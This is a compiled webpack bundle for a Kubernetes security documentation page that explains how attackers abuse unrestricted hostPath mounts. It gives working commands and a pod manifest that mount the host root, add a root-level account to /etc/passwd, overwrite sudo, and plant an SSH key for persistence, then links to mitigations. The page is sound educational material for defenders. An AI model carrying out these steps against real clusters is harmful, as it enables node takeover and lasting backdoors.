"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[6174],{4253:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>c,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>n,toc:()=>h});const n=JSON.parse('{"id":"attack_vectors/unrestricted_hostpath_mounts","title":"Unrestricted HostPath Mounts","description":"How attackers exploit unrestricted hostPath mounts to gain access to the host filesystem and escalate privileges.","source":"@site/docs/attack_vectors/unrestricted_hostpath_mounts.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/unrestricted_hostpath_mounts","permalink":"/k8s_security/docs/attack_vectors/unrestricted_hostpath_mounts","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/unrestricted_hostpath_mounts.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","sidebarPosition":14,"frontMatter":{"sidebar_position":14,"title":"Unrestricted HostPath Mounts","description":"How attackers exploit unrestricted hostPath mounts to gain access to the host filesystem and escalate privileges."},"sidebar":"default","previous":{"title":"Privileged Service Accounts","permalink":"/k8s_security/docs/attack_vectors/privileged_service_accounts"},"next":{"title":"Insecure CSI Drivers","permalink":"/k8s_security/docs/attack_vectors/insecure_csi_drivers"}}');var i=s(4848),o=s(8453);const a={sidebar_position:14,title:"Unrestricted HostPath Mounts",description:"How attackers exploit unrestricted hostPath mounts to gain access to the host filesystem and escalate privileges."},r="Unrestricted HostPath Mounts",c={},h=[{value:"Exploitation Steps: Abusing hostPath Mounts",id:"exploitation-steps-abusing-hostpath-mounts",level:2},{value:"Step 1: Identify Misconfigured hostPath Volumes",id:"step-1-identify-misconfigured-hostpath-volumes",level:3},{value:"Step 2: Deploy a Malicious Pod with a hostPath Mount",id:"step-2-deploy-a-malicious-pod-with-a-hostpath-mount",level:3},{value:"Step 3: Escalate Privileges",id:"step-3-escalate-privileges",level:3},{value:"Step 4: Persist in the System",id:"step-4-persist-in-the-system",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation Steps",id:"mitigation-steps",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"unrestricted-hostpath-mounts",children:"Unrestricted HostPath Mounts"})}),"\n",(0,i.jsxs)(t.p,{children:[(0,i.jsx)(t.strong,{children:"hostPath"})," volumes in Kubernetes allow pods to directly access the host filesystem. If improperly configured, attackers can exploit ",(0,i.jsx)(t.strong,{children:"unrestricted hostPath mounts"})," to ",(0,i.jsx)(t.strong,{children:"access sensitive files, modify system configurations, and escalate privileges"}),"."]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"exploitation-steps-abusing-hostpath-mounts",children:"Exploitation Steps: Abusing hostPath Mounts"}),"\n",(0,i.jsxs)(t.p,{children:["An attacker gains unauthorized access to the ",(0,i.jsx)(t.strong,{children:"host filesystem"})," by exploiting a misconfigured ",(0,i.jsx)(t.strong,{children:"hostPath volume"}),"."]}),"\n",(0,i.jsx)(t.h3,{id:"step-1-identify-misconfigured-hostpath-volumes",children:"Step 1: Identify Misconfigured hostPath Volumes"}),"\n",(0,i.jsxs)(t.p,{children:["The attacker searches for pods with ",(0,i.jsx)(t.strong,{children:"hostPath mounts"})," that expose critical directories:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'kubectl get pods -A -o=jsonpath=\'{range .items[*]}{.metadata.name}{"\\t"}{.spec.volumes[*].hostPath.path}{"\\n"}{end}\'\n'})}),"\n",(0,i.jsxs)(t.p,{children:["If a pod is mounting ",(0,i.jsx)(t.code,{children:"/etc"}),", ",(0,i.jsx)(t.code,{children:"/var/lib/kubelet"}),", or ",(0,i.jsx)(t.code,{children:"/root"}),", the attacker proceeds."]}),"\n",(0,i.jsx)(t.h3,{id:"step-2-deploy-a-malicious-pod-with-a-hostpath-mount",children:"Step 2: Deploy a Malicious Pod with a hostPath Mount"}),"\n",(0,i.jsxs)(t.p,{children:["The attacker creates a new pod that mounts a ",(0,i.jsx)(t.strong,{children:"privileged directory"})," from the host:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: exploit-hostpath\nspec:\n  containers:\n    - name: attacker-container\n      image: alpine\n      command: ["/bin/sh", "-c"]\n      args: ["sleep 3600"]\n      volumeMounts:\n        - mountPath: /host\n          name: host-root\n  volumes:\n    - name: host-root\n      hostPath:\n        path: /\n        type: Directory\n'})}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"kubectl apply -f exploit-hostpath.yaml\n"})}),"\n",(0,i.jsxs)(t.p,{children:["The pod now has ",(0,i.jsx)(t.strong,{children:"full access to the host filesystem"}),"."]}),"\n",(0,i.jsx)(t.h3,{id:"step-3-escalate-privileges",children:"Step 3: Escalate Privileges"}),"\n",(0,i.jsxs)(t.p,{children:["The attacker gains root access by modifying ",(0,i.jsx)(t.strong,{children:"/etc/passwd"}),":"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'echo "attacker:x:0:0::/root:/bin/bash" >> /host/etc/passwd\n'})}),"\n",(0,i.jsx)(t.p,{children:"Or by replacing a system binary with a malicious payload:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"echo '#!/bin/sh\\necho \"Root access gained\"' > /host/bin/sudo\nchmod +x /host/bin/sudo\n"})}),"\n",(0,i.jsx)(t.h3,{id:"step-4-persist-in-the-system",children:"Step 4: Persist in the System"}),"\n",(0,i.jsxs)(t.p,{children:["To maintain access, the attacker ",(0,i.jsx)(t.strong,{children:"creates a backdoor"})," by modifying the host\u2019s SSH keys:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'echo "attacker-public-key" >> /host/root/.ssh/authorized_keys\n'})}),"\n",(0,i.jsxs)(t.p,{children:["Even if Kubernetes detects and removes the pod, the attacker retains ",(0,i.jsx)(t.strong,{children:"persistent access"})," to the host."]}),"\n",(0,i.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,i.jsxs)(t.p,{children:["The attacker now has ",(0,i.jsx)(t.strong,{children:"root privileges on the host"}),", allowing them to ",(0,i.jsx)(t.strong,{children:"exfiltrate data, modify critical system files, and take full control of the Kubernetes node"}),"."]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"mitigation-steps",children:"Mitigation Steps"}),"\n",(0,i.jsxs)(t.p,{children:["To protect against ",(0,i.jsx)(t.strong,{children:"unrestricted hostPath mounts"}),", follow the security best practices outlined in:"]}),"\n",(0,i.jsxs)(t.p,{children:["\u27a1 ",(0,i.jsx)(t.strong,{children:(0,i.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/pod_security/unrestricted_hostpath_mitigation",children:"Restricting HostPath Mounts in Kubernetes"})})]}),"\n",(0,i.jsxs)(t.p,{children:["This guide covers techniques such as ",(0,i.jsx)(t.strong,{children:"disabling hostPath, enforcing PodSecurityAdmission policies, using AppArmor and Seccomp profiles, and restricting privileged containers"})," to prevent unauthorized access to the host filesystem."]})]})}function d(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},8453:(e,t,s)=>{s.d(t,{R:()=>a,x:()=>r});var n=s(6540);const i={},o=n.createContext(i);function a(e){const t=n.useContext(o);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function r(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),n.createElement(o.Provider,{value:t},e.children)}}}]);